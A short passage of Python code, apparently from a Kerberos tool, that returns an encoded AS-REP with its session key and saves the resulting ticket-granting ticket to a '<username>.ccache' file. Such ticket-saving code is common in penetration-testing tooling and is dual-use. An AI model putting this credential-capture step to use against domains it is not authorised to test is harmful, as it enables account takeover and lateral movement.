        return encoder.encode(as_rep), client_session_key

    def _saveTicket(
        self, username: str, encoded_asrep: bytes, client_session_key: Key
    ) -> str:
        ccache = CCache()
        ccache.fromTGT(encoded_asrep, client_session_key, client_session_key)
        out_path = f"{username}.ccache"
        ccache.saveFile(out_path)
        return out_path
